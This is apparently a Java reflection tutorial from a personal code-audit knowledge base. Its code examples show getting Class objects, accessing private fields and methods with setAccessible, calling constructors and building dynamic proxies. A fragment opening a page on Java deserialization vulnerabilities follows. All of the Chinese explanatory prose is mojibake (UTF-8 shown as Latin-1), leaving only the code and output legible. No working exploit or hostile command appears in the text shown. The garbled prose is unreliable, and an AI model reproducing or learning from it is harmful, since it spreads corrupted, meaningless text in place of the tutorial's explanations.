åå°„å°±æ˜¯Reflectionï¼ŒJavaçš„åå°„æ˜¯æŒ‡ç¨‹åºåœ¨è¿è¡ŒæœŸå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ã€‚å³Javaåå°„æœºåˆ¶æ˜¯åœ¨è¿è¡ŒçŠ¶æ€æ—¶ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§(åŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•å’Œå±æ€§)ï¼Œè¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½å°±ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚ classï¼ˆåŒ…æ‹¬interfaceï¼‰çš„æœ¬è´¨æ˜¯æ•°æ®ç±»å‹ï¼ˆTypeï¼‰ è€Œclassæ˜¯ç”±JVMåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€åŠ è½½çš„ã€‚JVMåœ¨ç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§classç±»å‹æ—¶ï¼Œå°†å…¶åŠ è½½è¿›å†…å­˜ã€‚ æ¯åŠ è½½ä¸€ç§classï¼ŒJVMå°±ä¸ºå…¶åˆ›å»ºä¸€ä¸ªClassç±»å‹çš„å®ä¾‹ï¼Œå¹¶å…³è”èµ·æ¥ã€‚æ³¨æ„ï¼šè¿™é‡Œçš„Classç±»å‹æ˜¯ä¸€ä¸ªåå«Classçš„classã€‚å®ƒé•¿è¿™æ ·ï¼š public final class Class { private Class() {} } ä»¥Stringç±»ä¸ºä¾‹ï¼Œå½“JVMåŠ è½½Stringç±»æ—¶ï¼Œå®ƒé¦–å…ˆè¯»å–String.classæ–‡ä»¶åˆ°å†…å­˜ï¼Œç„¶åï¼Œä¸ºStringç±»åˆ›å»ºä¸€ä¸ªClasså®ä¾‹å¹¶å…³è”èµ·æ¥ï¼š Class cls = new Class(String); è¿™ä¸ªClasså®ä¾‹æ˜¯JVMå†…éƒ¨åˆ›å»ºçš„ï¼Œå¦‚æœæˆ‘ä»¬æŸ¥çœ‹JDKæºç ï¼Œå¯ä»¥å‘ç°Classç±»çš„æ„é€ æ–¹æ³•æ˜¯privateï¼Œåªæœ‰JVMèƒ½åˆ›å»ºClasså®ä¾‹ï¼Œæˆ‘ä»¬è‡ªå·±çš„Javaç¨‹åºæ˜¯æ— æ³•åˆ›å»ºClasså®ä¾‹çš„ã€‚ æ‰€ä»¥ï¼ŒJVMæŒæœ‰çš„æ¯ä¸ªClasså®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»å‹ï¼ˆclassæˆ–interfaceï¼‰ ç”±äºJVMä¸ºæ¯ä¸ªåŠ è½½çš„classåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹ï¼Œå¹¶åœ¨å®ä¾‹ä¸­ä¿å­˜äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€åŒ…åã€çˆ¶ç±»ã€å®ç°çš„æ¥å£ã€æ‰€æœ‰æ–¹æ³•ã€å­—æ®µç­‰ï¼Œå› æ­¤ï¼Œå¦‚æœè·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯ã€‚ è¿™ç§é€šè¿‡Classå®ä¾‹è·å–classä¿¡æ¯çš„æ–¹æ³•ç§°ä¸ºåå°„ï¼ˆReflectionï¼‰ã€‚ è·å–classçš„Classå®ä¾‹ è·å–ä¸€ä¸ªclassçš„Classå®ä¾‹ï¼Œæœ‰4ä¸ªæ–¹æ³•ï¼š æ–¹æ³•ä¸€ ç›´æ¥é€šè¿‡ä¸€ä¸ªclassçš„é™æ€å˜é‡classè·å–ï¼š Class cls = String.class; æ–¹æ³•äºŒ å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå¯ä»¥é€šè¿‡è¯¥å®ä¾‹å˜é‡æä¾›çš„getClass()æ–¹æ³•è·å–ï¼š String s = \"Hello\"; Class cls = s.getClass(); æ–¹æ³•ä¸‰ å¦‚æœçŸ¥é“ä¸€ä¸ªclassçš„å®Œæ•´ç±»åï¼Œå¯ä»¥é€šè¿‡é™æ€æ–¹æ³•Class.forName()è·å–ï¼š Class cls = Class.forName(\"java.lang.String\"); æ–¹æ³•å›› åˆ©ç”¨classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") æ¯”è¾ƒ å› ä¸ºClasså®ä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ï¼Œä¸Šè¿°æ–¹æ³•è·å–çš„Classå®ä¾‹æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚å¯ä»¥ç”¨==æ¯”è¾ƒä¸¤ä¸ªClasså®ä¾‹ï¼š Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true è·å–åŸºæœ¬ä¿¡æ¯ è·å–classçš„åŸºæœ¬ä¿¡æ¯ package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } å°ç»“ JVMä¸ºæ¯ä¸ªåŠ è½½çš„classåŠinterfaceåˆ›å»ºäº†å¯¹åº”çš„Classå®ä¾‹æ¥ä¿å­˜classåŠinterfaceçš„æ‰€æœ‰ä¿¡æ¯ï¼› è·å–ä¸€ä¸ªclasså¯¹åº”çš„Classå®ä¾‹åï¼Œå°±å¯ä»¥è·å–è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼› é€šè¿‡Classå®ä¾‹è·å–classä¿¡æ¯çš„æ–¹æ³•ç§°ä¸ºåå°„ï¼ˆReflectionï¼‰ï¼› JVMæ€»æ˜¯åŠ¨æ€åŠ è½½classï¼Œå¯ä»¥åœ¨è¿è¡ŒæœŸæ ¹æ®æ¡ä»¶æ¥æ§åˆ¶åŠ è½½classã€‚ è®¿é—®å­—æ®µ å¯¹ä»»æ„çš„ä¸€ä¸ªObjectå®ä¾‹ï¼Œåªè¦æˆ‘ä»¬è·å–äº†å®ƒçš„Classï¼Œå°±å¯ä»¥è·å–å®ƒçš„ä¸€åˆ‡ä¿¡æ¯ã€‚ æˆ‘ä»¬å…ˆçœ‹çœ‹å¦‚ä½•é€šè¿‡Classå®ä¾‹è·å–å­—æ®µä¿¡æ¯ã€‚ è·å–å­—æ®µçš„ä¸€äº›ä¿¡æ¯ import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // è·å–æ‰€æœ‰publicçš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(Arrays.toString(ot.getDeclaredFields())); // è·å–å½“å‰ç±»çš„æ‰€æœ‰fieldï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(ot.getField(\"a\")); // æ ¹æ®å­—æ®µåè·å–æŸä¸ª public çš„fieldï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(ot.getDeclaredField(\"b\")); // æ ¹æ®å­—æ®µåè·å–å½“å‰ç±»çš„æŸä¸ªfieldï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(ot.getField(\"a\").getName()); // å­—æ®µåç§° System.out.println(ot.getField(\"a\").getType()); // å­—æ®µç±»å‹ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªClasså®ä¾‹ System.out.println(ot.getField(\"a\").getModifiers()); // ä¿®é¥°ç¬¦ } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 è·å–å­—æ®µçš„å€¼ å…ˆè·å–Classå®ä¾‹ï¼Œå†è·å–Fieldå®ä¾‹ï¼Œç„¶åï¼Œç”¨Field.get(Object)è·å–æŒ‡å®šå®ä¾‹çš„æŒ‡å®šå­—æ®µçš„å€¼ã€‚ package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // è®¾ç½®è®¿é—®æƒé™ï¼Œä¸€å¾‹ä¸ºtrueï¼Œä¸ç„¶ä¸èƒ½è®¿é—® private çš„ Object value = f.get(ot); // ä»å¯¹è±¡otä¸­è·å–å€¼ï¼Œå› ä¸ºæ‰€æœ‰çš„åŒç±»å‹classå…±ç”¨ä¸€ä¸ªClassï¼Œæ‰€ä»¥è·å–å†…å®¹è¦é€‰å®šå¯¹è±¡ System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // è¾“å‡º haha åå°„æ˜¯ä¸€ç§éå¸¸è§„çš„ç”¨æ³•ï¼Œä½¿ç”¨åå°„ï¼Œé¦–å…ˆä»£ç éå¸¸ç¹çï¼Œå…¶æ¬¡ï¼Œå®ƒæ›´å¤šåœ°æ˜¯ç»™å·¥å…·æˆ–è€…åº•å±‚æ¡†æ¶æ¥ä½¿ç”¨ï¼Œç›®çš„æ˜¯åœ¨ä¸çŸ¥é“ç›®æ ‡å®ä¾‹ä»»ä½•ä¿¡æ¯çš„æƒ…å†µä¸‹ï¼Œè·å–ç‰¹å®šå­—æ®µçš„å€¼ã€‚ æ­¤å¤–ï¼ŒsetAccessible(true)å¯èƒ½ä¼šå¤±è´¥ã€‚å¦‚æœJVMè¿è¡ŒæœŸå­˜åœ¨SecurityManagerï¼Œé‚£ä¹ˆå®ƒä¼šæ ¹æ®è§„åˆ™è¿›è¡Œæ£€æŸ¥ï¼Œæœ‰å¯èƒ½é˜»æ­¢setAccessible(true)ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªSecurityManagerå¯èƒ½ä¸å…è®¸å¯¹javaå’Œjavaxå¼€å¤´çš„packageçš„ç±»è°ƒç”¨setAccessible(true)ï¼Œè¿™æ ·å¯ä»¥ä¿è¯JVMæ ¸å¿ƒåº“çš„å®‰å…¨ã€‚ ä¿®æ”¹å­—æ®µçš„å€¼ package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // è®¾ç½®è®¿é—®æƒé™ï¼Œä¸€å¾‹ä¸ºtrueï¼Œä¸ç„¶ä¸èƒ½è®¿é—® private çš„ f.set(ot, \"modify\"); // åå°„ä¿®æ”¹å€¼ System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } å°ç»“ Javaçš„åå°„APIæä¾›çš„Fieldç±»å°è£…äº†å­—æ®µçš„æ‰€æœ‰ä¿¡æ¯ï¼š é€šè¿‡Classå®ä¾‹çš„æ–¹æ³•å¯ä»¥è·å–Fieldå®ä¾‹ï¼šgetField()ï¼ŒgetFields()ï¼ŒgetDeclaredField()ï¼ŒgetDeclaredFields()ï¼› é€šè¿‡Fieldå®ä¾‹å¯ä»¥è·å–å­—æ®µä¿¡æ¯ï¼šgetName()ï¼ŒgetType()ï¼ŒgetModifiers()ï¼› é€šè¿‡Fieldå®ä¾‹å¯ä»¥è¯»å–æˆ–è®¾ç½®æŸä¸ªå¯¹è±¡çš„å­—æ®µï¼Œå¦‚æœå­˜åœ¨è®¿é—®é™åˆ¶ï¼Œè¦é¦–å…ˆè°ƒç”¨setAccessible(true)æ¥è®¿é—®épublicå­—æ®µã€‚ é€šè¿‡åå°„è¯»å†™å­—æ®µæ˜¯ä¸€ç§éå¸¸è§„æ–¹æ³•ï¼Œå®ƒä¼šç ´åå¯¹è±¡çš„å°è£…ã€‚ è°ƒç”¨æ–¹æ³•ï¼ˆâ€¼ï¸ï¼‰ è·å–æ–¹æ³• é€šè¿‡Classå®ä¾‹è·å–æ‰€æœ‰Methodä¿¡æ¯ã€‚Classç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // è·å–æ‰€æœ‰publicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(Arrays.toString(cls.getDeclaredMethods())); // è·å–å½“å‰ç±»çš„æ‰€æœ‰Methodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ System.out.println(cls.getMethod(\"echoEver\", String.class)); // è·å–æŸä¸ªpublicçš„Methodï¼ˆåŒ…æ‹¬çˆ¶ç±»ï¼‰ //.getMethod(æ–¹æ³•åï¼Œè¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹) System.out.println(cls.getDeclaredMethod(\"echoEver\", String.class)); // è·å–å½“å‰ç±»çš„æŸä¸ªMethodï¼ˆä¸åŒ…æ‹¬çˆ¶ç±»ï¼‰ } } class OtherTest{ public void echoEver(String thing){ System.out.println(thing); } } // ===== /* [public void org.example.OtherTest.echoEver(java.lang.String), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] [public void org.example.OtherTest.echoEver(java.lang.String)] public void org.example.OtherTest.echoEver(java.lang.String) public void org.example.OtherTest.echoEver(java.lang.String) */ è°ƒç”¨æ–¹æ³• è·å–Classå®ä¾‹ åå°„è·å–æ–¹æ³• invokeè°ƒç”¨æ–¹æ³• package org.example; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class App { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { OtherTest ot = new OtherTest(); Class cls = ot.getClass(); Method echoEver = cls.getDeclaredMethod(\"echoEver\", String.class); echoEver.setAccessible(true); echoEver.invoke(ot,\"test\"); // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è°ƒç”¨è¯¥æ–¹æ³•çš„å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæ˜¯è¿™ä¸ªæ–¹æ³•çš„éœ€è¦ä¼ å…¥çš„å‚æ•° } } class OtherTest{ private void echoEver(String thing){ System.out.println(thing); } } å°ç»“ Javaçš„åå°„APIæä¾›çš„Methodå¯¹è±¡å°è£…äº†æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼š é€šè¿‡Classå®ä¾‹çš„æ–¹æ³•å¯ä»¥è·å–Methodå®ä¾‹ï¼šgetMethod()ï¼ŒgetMethods()ï¼ŒgetDeclaredMethod()ï¼ŒgetDeclaredMethods()ï¼› é€šè¿‡Methodå®ä¾‹å¯ä»¥è·å–æ–¹æ³•ä¿¡æ¯ï¼šgetName()ï¼ŒgetReturnType()ï¼ŒgetParameterTypes()ï¼ŒgetModifiers()ï¼› é€šè¿‡Methodå®ä¾‹å¯ä»¥è°ƒç”¨æŸä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼šObject invoke(Object instance, Object... parameters)ï¼› é€šè¿‡è®¾ç½®setAccessible(true)æ¥è®¿é—®épublicæ–¹æ³•ï¼› é€šè¿‡åå°„è°ƒç”¨æ–¹æ³•æ—¶ï¼Œä»ç„¶éµå¾ªå¤šæ€åŸåˆ™ã€‚ è°ƒç”¨æ„é€ æ–¹æ³• ä¸¾ä¾‹ æˆ‘ä»¬é€šå¸¸ä½¿ç”¨newæ“ä½œç¬¦åˆ›å»ºæ–°çš„å®ä¾‹ï¼š Person p = new Person(); å¦‚æœé€šè¿‡åå°„æ¥åˆ›å»ºæ–°çš„å®ä¾‹ï¼Œå¯ä»¥è°ƒç”¨Classæä¾›çš„newInstance()æ–¹æ³•ï¼š Person p = Person.class.newInstance(); è°ƒç”¨Class.newInstance()çš„å±€é™æ˜¯ï¼Œå®ƒåªèƒ½è°ƒç”¨è¯¥ç±»çš„publicæ— å‚æ•°æ„é€ æ–¹æ³•ã€‚å¦‚æœæ„é€ æ–¹æ³•å¸¦æœ‰å‚æ•°ï¼Œæˆ–è€…ä¸æ˜¯publicï¼Œå°±æ— æ³•ç›´æ¥é€šè¿‡Class.newInstance()æ¥è°ƒç”¨ã€‚ ä¸ºäº†è°ƒç”¨ä»»æ„çš„æ„é€ æ–¹æ³•ï¼ŒJavaçš„åå°„APIæä¾›äº†Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚Constructorå¯¹è±¡å’ŒMethodéå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„ä»…åœ¨äºå®ƒæ˜¯ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ï¼Œè°ƒç”¨ç»“æœæ€»æ˜¯è¿”å›å®ä¾‹ï¼š package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class App { public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class cls = Integer.class; System.out.println(cls.getName()); System.out.println(Arrays.toString(cls.getConstructors())); // Integer.class.getConstructor(int.class); Constructor cons1 = cls.getConstructor(int.class); Integer int1 = cons1.newInstance(123); System.out.println(int1); Constructor cons2 = cls.getConstructor(String.class); System.out.println(cons2.newInstance(\"456\")); } } /* java.lang.Integer [public java.lang.Integer(int), public java.lang.Integer(java.lang.String) throws java.lang.NumberFormatException] 123 456 */ é€šè¿‡Classå®ä¾‹è·å–Constructorçš„æ–¹æ³•å¦‚ä¸‹ï¼š getConstructor(Class...)ï¼šè·å–æŸä¸ªpublicçš„Constructorï¼› getDeclaredConstructor(Class...)ï¼šè·å–æŸä¸ªConstructorï¼› getConstructors()ï¼šè·å–æ‰€æœ‰publicçš„Constructorï¼› getDeclaredConstructors()ï¼šè·å–æ‰€æœ‰Constructorã€‚ æ³¨æ„Constructoræ€»æ˜¯å½“å‰ç±»å®šä¹‰çš„æ„é€ æ–¹æ³•ï¼Œå’Œçˆ¶ç±»æ— å…³ï¼Œå› æ­¤ä¸å­˜åœ¨å¤šæ€çš„é—®é¢˜ã€‚ è°ƒç”¨épublicçš„Constructoræ—¶ï¼Œå¿…é¡»é¦–å…ˆé€šè¿‡setAccessible(true)è®¾ç½®å…è®¸è®¿é—®ã€‚setAccessible(true)å¯èƒ½ä¼šå¤±è´¥ã€‚ å°ç»“ Constructorå¯¹è±¡å°è£…äº†æ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼› é€šè¿‡Classå®ä¾‹çš„æ–¹æ³•å¯ä»¥è·å–Constructorå®ä¾‹ï¼šgetConstructor()ï¼ŒgetConstructors()ï¼ŒgetDeclaredConstructor()ï¼ŒgetDeclaredConstructors()ï¼› é€šè¿‡Constructorå®ä¾‹å¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼šnewInstance(Object... parameters)ï¼› é€šè¿‡è®¾ç½®setAccessible(true)æ¥è®¿é—®épublicæ„é€ æ–¹æ³•ã€‚ è·å–ç»§æ‰¿å…³ç³» è·å–çˆ¶ç±»classå’Œinterface import java.util.Arrays; public class Test{ public static void main(String[] args) { OtherTest ot = new OtherTest(\"emm\"); Class cls = ot.getClass(); System.out.println(cls.getSuperclass()); // è·å–çˆ¶ç±»class System.out.println(Arrays.toString(cls.getInterfaces())); // è·å–æ¥å£ System.out.println(\"\".getClass().getSuperclass()); // è·å– String çš„çˆ¶ç±» } } class OtherTest extends Emmm implements Aaa{ private String name; public OtherTest(String name){ this.name = name; } @Override public void echo() { System.out.println(\"666\"); } } class Emmm { private int aa; } interface Aaa{ public void echo(); } /* class org.example.Emmm [interface org.example.Aaa] class java.lang.Object */ å°ç»“ é€šè¿‡Classå¯¹è±¡å¯ä»¥è·å–ç»§æ‰¿å…³ç³»ï¼š Class getSuperclass()ï¼šè·å–çˆ¶ç±»ç±»å‹ï¼› Class[] getInterfaces()ï¼šè·å–å½“å‰ç±»å®ç°çš„æ‰€æœ‰æ¥å£ã€‚ é€šè¿‡Classå¯¹è±¡çš„isAssignableFrom()æ–¹æ³•å¯ä»¥åˆ¤æ–­ä¸€ä¸ªå‘ä¸Šè½¬å‹æ˜¯å¦å¯ä»¥å®ç°ã€‚ åŠ¨æ€ä»£ç† æœ‰æ²¡æœ‰å¯èƒ½ä¸ç¼–å†™å®ç°ç±»ï¼Œç›´æ¥åœ¨è¿è¡ŒæœŸåˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹å‘¢ï¼Ÿ è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºJavaæ ‡å‡†åº“æä¾›äº†ä¸€ç§åŠ¨æ€ä»£ç†ï¼ˆDynamic Proxyï¼‰çš„æœºåˆ¶ï¼šå¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹ã€‚ æ‰€è°“åŠ¨æ€ä»£ç†ï¼Œæ˜¯å’Œé™æ€ç›¸å¯¹åº”çš„ã€‚æˆ‘ä»¬æ¥çœ‹é™æ€ä»£ç æ€ä¹ˆå†™ï¼š // åˆ›å»ºæ¥å£ public interface Hello { void morning(String name); } // å®ç°æ¥å£Hello public class HelloWorld implements Hello { public void morning(String name) { System.out.println(\"Good morning, \" + name); } } // åˆ›å»ºå®ä¾‹ï¼Œè°ƒç”¨ public static void main(String[] args) { Hello hello = new HelloWorld(); hello.morning(\"Bob\"); } åŠ¨æ€å¦‚ä¸‹ è¿‡ç¨‹ ï¼Œä¸éœ€è¦å•ç‹¬å®ç°æ¥å£ï¼Œè€Œæ˜¯åŠ¨æ€å®ç°æ¥å£ã€‚ è¿‡ç¨‹ åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºä¸€ä¸ªinterfaceå®ä¾‹çš„æ–¹æ³•å¦‚ä¸‹ï¼š å®šä¹‰ä¸€ä¸ªInvocationHandlerå®ä¾‹ï¼Œå®ƒè´Ÿè´£å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ï¼› é€šè¿‡Proxy.newProxyInstance()åˆ›å»ºinterfaceå®ä¾‹ï¼Œå®ƒéœ€è¦3ä¸ªå‚æ•°ï¼š ä½¿ç”¨çš„ClassLoaderï¼Œé€šå¸¸å°±æ˜¯æ¥å£ç±»çš„ClassLoaderï¼› éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ï¼Œè‡³å°‘éœ€è¦ä¼ å…¥ä¸€ä¸ªæ¥å£è¿›å»ï¼› ç”¨æ¥å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„InvocationHandlerå®ä¾‹ã€‚ å°†è¿”å›çš„Objectå¼ºåˆ¶è½¬å‹ä¸ºæ¥å£ã€‚ package org.example; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class App{ public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); System.out.println(args.length); // å®ç°å¯¹åº”çš„æ–¹æ³• if (method.getName().equals(\"echo\")){ System.out.println(args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(Hello.class.getClassLoader(), new Class[]{Hello.class}, handler); hello.echo(\"9999\"); } } interface Hello{ public void echo(String s); } /* 1 9999 */ å°ç»“ Javaæ ‡å‡†åº“æä¾›äº†åŠ¨æ€ä»£ç†åŠŸèƒ½ï¼Œå…è®¸åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºä¸€ä¸ªæ¥å£çš„å®ä¾‹ï¼› åŠ¨æ€ä»£ç†æ˜¯é€šè¿‡Proxyåˆ›å»ºä»£ç†å¯¹è±¡ï¼Œç„¶åå°†æ¥å£æ–¹æ³•â€œä»£ç†â€ç»™InvocationHandlerå®Œæˆçš„ã€‚ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/03.Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/03.Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–.html","title":"03.Javaåºåˆ—åŒ–ä¸ååºåˆ—åŒ–","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 Java åºåˆ—åŒ–å’Œååºåˆ—åŒ– ä»‹ç» ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– åºåˆ—åŒ–è¦æ±‚ å…¶ä»– åºåˆ—åŒ–æ­¥éª¤ ååºåˆ—åŒ–æ­¥éª¤ ä»£ç ä¸¾ä¾‹ åºåˆ—åŒ–å’Œååºåˆ—åŒ– --> æ–‡ä»¶ åºåˆ—åŒ–å’Œååºåˆ—åŒ– --> bytesæ•°ç»„ åºåˆ—åŒ–ç‰¹å¾ å®‰å…¨æ€§ ååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»æµç¨‹ æ¼æ´æŒ–æ˜ Java åºåˆ—åŒ–å’Œååºåˆ—åŒ– ä»‹ç» åºåˆ—åŒ–å’Œååºåˆ—åŒ–éƒ½æ˜¯åœ¨å¯¹è±¡çš„åŸºç¡€ä¸Šè¿›è¡Œçš„ï¼ï¼ï¼ å¿…é¡»è¦ implements Serializable çš„ç±»æ‰å¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ– ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ– javaçš„åºåˆ—åŒ–æœºåˆ¶å°±æ˜¯ä¸ºäº†æŒä¹…åŒ–å­˜å‚¨æŸä¸ªå¯¹è±¡æˆ–è€…åœ¨ç½‘ç»œä¸Šä¼ è¾“æŸä¸ªå¯¹è±¡ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œä¸€æ—¦jvmå…³é—­ï¼Œé‚£ä¹ˆjavaä¸­çš„å¯¹è±¡ä¹Ÿå°±é”€æ¯äº†ï¼Œæ‰€ä»¥è¦æƒ³ä¿å­˜å®ƒï¼Œå°±éœ€è¦æŠŠä»–è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—å†™åˆ°æŸä¸ªæ–‡ä»¶æˆ–æ˜¯å…¶å®ƒå“ªé‡Œã€‚ Java æä¾›äº†ä¸€ç§å¯¹è±¡åºåˆ—åŒ–çš„æœºåˆ¶ï¼Œè¯¥æœºåˆ¶ä¸­ï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªå­—èŠ‚åºåˆ—ï¼Œè¯¥å­—èŠ‚åºåˆ—åŒ…æ‹¬è¯¥å¯¹è±¡çš„æ•°æ®ã€æœ‰å…³å¯¹è±¡çš„ç±»å‹çš„ä¿¡æ¯å’Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­æ•°æ®çš„ç±»å‹ã€‚å³åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªbyte[]æ•°ç»„ã€‚ ä¸ºä»€ä¹ˆè¦æŠŠJavaå¯¹è±¡åºåˆ—åŒ–å‘¢ï¼Ÿå› ä¸ºåºåˆ—åŒ–åå¯ä»¥æŠŠbyte[]ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œæˆ–è€…æŠŠbyte[]é€šè¿‡ç½‘ç»œä¼ 